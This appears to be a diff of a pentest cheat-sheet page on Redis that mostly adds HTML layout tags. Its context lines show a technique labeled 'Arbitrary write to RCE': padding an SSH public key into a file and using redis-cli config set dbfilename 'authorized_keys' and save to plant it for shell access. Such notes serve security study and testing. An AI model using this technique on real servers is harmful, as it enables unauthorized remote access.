@@ -5,7 +5,9 @@ tags: ["redis", "redis-cli", "privesc"]
 ---
 
 ---
-### Basic Commands
+### Basic
+
+<div>
 
 ```bash
 # Connect
@@ -32,7 +34,15 @@ incr key
 get key
 ```
 
+<div>
+
+<br>
+
+---
+
 ### Abuse #1: Arbitrary write to RCE
+
+<div>
 
 ```bash
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
@@ -58,5 +68,7 @@ redis-cli -h 127.0.0.1 config set dbfilename "authorized_keys"
 ```bash
 redis-cli -h 127.0.0.1 save
 ```
+
+</div>
 
 <br>
